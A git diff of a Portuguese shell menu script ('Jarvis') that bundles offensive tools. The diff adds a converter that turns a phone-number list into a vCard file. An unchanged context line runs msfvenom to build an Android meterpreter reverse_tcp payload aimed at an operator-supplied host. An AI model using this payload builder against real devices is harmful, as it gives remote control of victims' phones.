@@ -10,7 +10,7 @@ echo "			     @version: Jarvis/1.0 %16/06/2021%19:17h"
 echo "\n"
 echo "1 --> J2dex/Jd-GUI"
 echo "2 --> MSF/msfconsole/msfvenom"
-echo "3 --> ?"
+echo "3 --> Convert List txt Para VCF"
 echo "4 --> ?"
 echo "5 --> ?"
 read  op
@@ -115,7 +115,37 @@ sudo msfvenom -p android/meterpreter/reverse_tcp LHOST="$ip" LPORT=3333 > $PWD/b
 
 fi
 elif [ $op -eq 3 ];then
-echo " "
+echo "ATENÇÃO... CERTIFIQUE-SE DE ADICIONAR OS ARQUIVOS...."
+echo "....ex: sh jarvis.sh {lista de numeros} {lista de contatos}"
+echo "caso nenhum contato seja passado os nomes eram substinuidos por números automaticamente..."
+sleep 1
+clear
+nome=1
+create_l(){
+        touch vcard_new.vcf
+        echo "BEGIN:VCARD" >> vcard_new.vcf
+        echo "VERSION:2.1" >> vcard_new.vcf
+        echo "N:;$nome;;;" >> vcard_new.vcf
+        echo "FN:$nome" >> vcard_new.vcf
+        echo "TEL;CELL:$contato" >> vcard_new.vcf
+        echo "END:VCARD" >> vcard_new.vcf
+}
+for contato in $(cat $1);do
+
+        if [ -z $2  ]; then
+	echo "editando por numeração ...."
+	clear
+          nome=$(($nome+1))
+        create_l
+        else
+		echo "lista de nomes indentificada!"
+		echo "adicionando por nomes de contato..."
+		clear
+                for nome in $(cat $2);do
+                create_l
+                done
+        fi
+done
 elif [ $op -eq 4 ];then
 echo " "
 elif [ $op -eq 5 ];then
